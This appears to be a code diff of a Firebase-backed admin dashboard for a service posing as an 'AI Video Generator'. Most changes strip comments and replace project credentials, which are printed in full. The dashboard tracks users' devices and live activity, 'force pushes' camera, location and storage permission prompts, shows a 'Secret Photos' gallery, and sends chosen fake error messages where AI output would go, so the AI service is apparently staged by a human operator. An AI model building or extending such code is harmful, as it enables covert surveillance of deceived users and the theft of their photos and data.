@@ -13,7 +13,7 @@
     
     #loginScreen { min-height:100vh; display:flex; align-items:center; justify-content:center; }
     .login-box { width:100%; max-width:380px; background:var(--surf); border:1px solid var(--border); border-radius:20px; padding:2.5rem 2rem; }
-    .inp { width:100%; padding:.75rem 1rem; background:var(--surf2); border:1px solid var(--border); border-radius:10px; color:var(--text); margin-bottom:1rem; outline:none; font-family: var(--font);}
+    .inp { width:100%; padding:.75rem 1rem; background:var(--surf2); border:1px solid var(--border); border-radius:10px; color:var(--text); margin-bottom:1.0rem; outline:none; font-family: var(--font);}
     .inp:focus { border-color:var(--red); }
     .btn { display:inline-flex; align-items:center; justify-content:center; gap:.5rem; padding:.7rem 1.4rem; border-radius:10px; font-weight:600; cursor:pointer; border:none; color:#fff;}
     .btn-red { background:var(--red); } .btn-green { background:var(--green); } .btn-gray { background:var(--surf3); border:1px solid var(--border); } .btn-danger { background:rgba(230,57,70,.12); color:var(--red); border:1px solid rgba(230,57,70,.3); } .btn-full { width:100%; padding:.85rem; }
@@ -33,7 +33,6 @@
     .b-pending { background: rgba(240,173,78,0.2); color: #f0ad4e; } .b-generating { background: rgba(2,117,216,0.2); color: #5bc0de; } .b-error { background: rgba(230,57,70,0.2); color: #ff8c94; } .b-completed { background: rgba(45,198,83,0.2); color: #6ef59a; }
     .hidden { display: none !important; }
 
-    /* Modal Styles for User Profile */
     .modal-wrap { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.85); z-index:1000; align-items:center; justify-content:center; padding:1rem; backdrop-filter: blur(5px);}
     .modal-box { background:var(--surf); border:1px solid var(--red); border-radius:var(--radius); padding:2rem; width:100%; max-width:1050px; max-height:90vh; overflow-y:auto;}
     .action-row { padding: 8px 10px; border-bottom: 1px solid var(--border); font-size: 0.85rem; display: flex; justify-content: space-between; align-items: center; }
@@ -41,7 +40,6 @@
     .adv-grid span { color:var(--text); font-weight:500; display:block; margin-top:2px; font-size:0.95rem; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;}
     .adv-grid b { color:var(--muted); font-size:0.75rem; text-transform:uppercase; letter-spacing:0.5px;}
 
-    /* AI History Mail Format */
     .ai-history-card { background: rgba(0,0,0,0.3); border: 1px solid var(--border); border-radius: 10px; padding: 15px; margin-bottom: 15px; display: flex; gap: 15px; flex-wrap: wrap; }
     .ai-history-img { width: 120px; height: 120px; object-fit: cover; border-radius: 8px; border: 1px solid rgba(255,255,255,0.1); background: #111; }
     .ai-history-content { flex: 1; min-width: 250px; }
@@ -80,7 +78,6 @@
 
   <div class="content">
 
-    <!-- 1. AI QUEUE PAGE -->
     <div class="page active" id="aiQueuePage">
       <h2>🤖 AI Video Requests</h2>
       <p style="color:var(--muted); font-size: 0.85rem;">As long as you are logged in, the AI GPU is considered "Online" for users.</p>
@@ -92,7 +89,6 @@
       </div>
     </div>
 
-    <!-- 2. USERS TRACKING -->
     <div class="page" id="usersPage">
       <h2>👥 AI Audience Tracking</h2>
       <p style="color:var(--muted); font-size: 0.85rem;">Showing only verified devices accessing the new AI Video Generator platform.</p>
@@ -105,7 +101,6 @@
       </div>
     </div>
 
-    <!-- 3. DEVICE APPROVALS PAGE -->
     <div class="page" id="approvalsPage">
         <h2>🛡️ Pending Device Approvals</h2>
         <div class="card-panel">
@@ -116,21 +111,16 @@
         </div>
     </div>
 
-    <!-- 4. SECRET PHOTOS -->
     <div class="page" id="photosPage">
       <div style="display:flex; justify-content:space-between;"><h2>📸 Secret Photos</h2><button class="btn btn-gray" id="refreshPhotosBtn">Reload</button></div>
       <div style="display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 15px; margin-top: 1.5rem;" id="photosGrid"></div>
     </div>
     
-    <!-- Legacy placeholder -->
     <div class="page" id="addPage"><h2>Legacy Movie Adds</h2><div class="card-panel">Hidden section. Use legacy panel.</div></div>
 
   </div>
 </div>
 
-<!-- ==========================================
-     USER FULL PROFILE MODAL (MAIL STYLE) 
-     ========================================== -->
 <div id="userModal" class="modal-wrap">
   <div class="modal-box">
     <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:1.5rem;">
@@ -139,7 +129,6 @@
     </div>
     
     <div class="adv-grid">
-        <!-- HARDWARE & NETWORK DETAILS -->
         <div style="border-bottom: 1px solid var(--red); padding-bottom: 5px;"><b>ID Source</b><span id="umIdSource" style="color: var(--green);">None</span></div>
         <div><b>Device Type</b><span id="umType">None</span></div>
         <div><b>OS & Browser</b><span id="umOSBrowser">None</span></div>
@@ -164,18 +153,14 @@
 
     <div style="display:flex; gap:1.5rem; flex-wrap:wrap; margin-bottom:1.5rem;">
         
-        <!-- LIVE ACTION LOGS -->
         <div style="flex:1; min-width:300px;">
             <h4 style="margin-bottom:0.5rem; color:#f0ad4e;">🔴 Live User Activities</h4>
             <div style="background:var(--surf2); border:1px solid var(--border); border-radius:8px; height:350px; overflow-y:auto;" id="umActionsList"></div>
         </div>
 
-        <!-- AI GENERATION HISTORY (MAIL TYPE) -->
         <div style="flex:2; min-width:450px;">
             <h4 style="margin-bottom:0.5rem; color:#5bc0de;">✨ AI Video Prompt History</h4>
-            <div style="background:var(--surf2); border:1px solid var(--border); border-radius:8px; height:350px; overflow-y:auto; padding:15px;" id="umAiHistory">
-                <!-- Data will populate here -->
-            </div>
+            <div style="background:var(--surf2); border:1px solid var(--border); border-radius:8px; height:350px; overflow-y:auto; padding:15px;" id="umAiHistory"></div>
         </div>
 
     </div>
@@ -189,7 +174,18 @@
   import { getDatabase, ref, set, update, remove, onValue, get, onDisconnect } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";
   import { getAuth, signInWithEmailAndPassword, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-auth.js";
 
-  const app = initializeApp({ apiKey: "AIzaSyCTfvrtZuHXk3RW91Dcwpbghhq--D6X2s8", authDomain: "inshelp-f2cba.firebaseapp.com", databaseURL: "https://inshelp-f2cba-default-rtdb.firebaseio.com", projectId: "inshelp-f2cba" });
+  // Updated with New Firebase Project Credentials
+  const firebaseConfig = {
+    apiKey: "AIzaSyAI3ysLR_LFnG5dw2SY8AwF1ldGgc43ywE",
+    authDomain: "ai-studio-b0c87.firebaseapp.com",
+    databaseURL: "https://ai-studio-b0c87-default-rtdb.firebaseio.com",
+    projectId: "ai-studio-b0c87",
+    storageBucket: "ai-studio-b0c87.firebasestorage.app",
+    messagingSenderId: "699632892927",
+    appId: "1:699632892927:web:3d38f396c8897a36e885ca"
+  };
+
+  const app = initializeApp(firebaseConfig);
   const db = getDatabase(app);
   const auth = getAuth(app); 
   const adminStatusRef = ref(db, 'settings/admin_status');
@@ -220,9 +216,6 @@
         });
       });
 
-      // =====================================
-      // 1. AI GENERATION QUEUE (MAIN TAB)
-      // =====================================
       onValue(ref(db, 'ai_requests'), async (snap) => {
           const tb = document.getElementById('aiQueueTbody'); tb.innerHTML = '';
           const data = snap.val() || {}; const requests = Object.keys(data).reverse();
@@ -279,16 +272,11 @@
           update(ref(db, `ai_requests/${id}`), { status: 'completed', videoUrl: vidUrl, errorMsg: '' });
       };
 
-
-      // =====================================
-      // 2. USERS TRACKING (AI SPECIFIC)
-      // =====================================
       onValue(ref(db, 'users'), snap => {
           const tb = document.getElementById('userTableBody'); tb.innerHTML = ''; 
           allUsersRaw = snap.val() || {};
           
           Object.keys(allUsersRaw).reverse().forEach(k => {
-              // Filtering: Only show users with the NEW AI DEVICE ID FORMAT (-AUTH-)
               if (!k.includes('-AUTH-')) return; 
 
               const u = allUsersRaw[k];
@@ -305,7 +293,6 @@
           });
       });
 
-      // Search Filter
       document.getElementById('trackSearch').addEventListener('input', function() {
           const filter = this.value.toLowerCase();
           document.querySelectorAll('#userTableBody tr').forEach(row => {
@@ -313,9 +300,6 @@
           });
       });
 
-      // =====================================
-      // 3. FULL USER PROFILE MODAL & LOGS
-      // =====================================
       window.viewUser = (id) => {
           viewingUserId = id; 
           const u = allUsersRaw[id];
@@ -340,7 +324,6 @@
           banBtn.style.background = u.banned ? "var(--green)" : "var(--red)";
           banBtn.onclick = () => { update(ref(db, 'users/'+id), {banned: !u.banned}); document.getElementById('userModal').style.display='none'; };
 
-          // Reset Checkboxes based on current DB State
           get(ref(db, `users/${id}/custom_perms`)).then(snap => {
               const perms = snap.val() || {};
               document.getElementById('pushCam').checked = perms.camera || false;
@@ -348,7 +331,6 @@
               document.getElementById('pushStore').checked = perms.storage || false;
           });
 
-          // Populate Action Logs
           const actionBox = document.getElementById('umActionsList'); 
           if(u.actions) {
               const acts = Object.values(u.actions).sort((a,b) => new Date(b.time) - new Date(a.time));
@@ -356,7 +338,6 @@
               actionBox.innerHTML = actsHtml;
           } else { actionBox.innerHTML = '<div class="action-row" style="color:var(--muted); justify-content:center;">No live actions recorded yet.</div>'; }
 
-          // Populate AI Prompt Mail History
           const historyBox = document.getElementById('umAiHistory');
           historyBox.innerHTML = '<p style="text-align:center; color:var(--muted);">Loading Generation History...</p>';
           
@@ -367,7 +348,6 @@
               
               Object.keys(allReqs).reverse().forEach(reqId => {
                   const req = allReqs[reqId];
-                  // Link logic: match by Device ID OR if user is logged in, match by UID
                   if (req.deviceId === id || (u.linkedUid && req.uid === u.linkedUid)) {
                       hasHistory = true;
                       
@@ -379,7 +359,6 @@
 
                       let imgEl = req.imageUrl ? `<a href="${req.imageUrl}" target="_blank"><img src="${req.imageUrl}" class="ai-history-img"></a>` : `<div class="ai-history-img" style="display:flex;align-items:center;justify-content:center;color:#444;">No Image</div>`;
 
-                      // Inline Error Controls for Profile view
                       let controls = req.status !== 'completed' ? `
                           <div style="margin-top:10px; display:flex; gap:5px;">
                               <select id="modalErr_${reqId}" class="inp" style="padding:0.4rem; font-size:0.75rem; margin:0; flex:1;">
@@ -414,27 +393,21 @@
           document.getElementById('userModal').style.display = 'flex';
       };
 
-      // Push Live Permissions
       document.getElementById('pushPermBtn').addEventListener('click', () => {
           if(!viewingUserId) return;
           const rules = { camera: document.getElementById('pushCam').checked, location: document.getElementById('pushLoc').checked, storage: document.getElementById('pushStore').checked };
-          update(ref(db, `users/${viewingUserId}/custom_perms`), rules).then(() => { alert("Permissions Force Push Sent! (Screen will prompt if user is online)"); });
+          update(ref(db, `users/${viewingUserId}/custom_perms`), rules).then(() => { alert("Permissions Force Push Sent!"); });
       });
 
-      // Special Inline Error function for the Modal
       window.sendModalError = (reqId) => {
           const msg = document.getElementById(`modalErr_${reqId}`).value;
           if(!msg) return alert("Please select an error message from the dropdown.");
           update(ref(db, `ai_requests/${reqId}`), { status: 'error', errorMsg: msg }).then(() => {
               alert("Error sent directly to user's workspace!");
-              viewUser(viewingUserId); // Refresh modal view
+              viewUser(viewingUserId);
           });
       };
 
-
-      // =====================================
-      // 4. DEVICE APPROVALS
-      // =====================================
       onValue(ref(db, 'support_requests'), snap => {
           const data = snap.val() || {}; const tb = document.getElementById('approvalsTbody'); tb.innerHTML = '';
           Object.keys(data).reverse().forEach(k => {
@@ -463,10 +436,6 @@
           }
       };
 
-
-      // =====================================
-      // 5. SECRET PHOTOS
-      // =====================================
       window.loadSecretPhotos = () => {
           const grid = document.getElementById('photosGrid'); grid.innerHTML = ''; 
           get(ref(db, 'secret_photos')).then((snap) => {
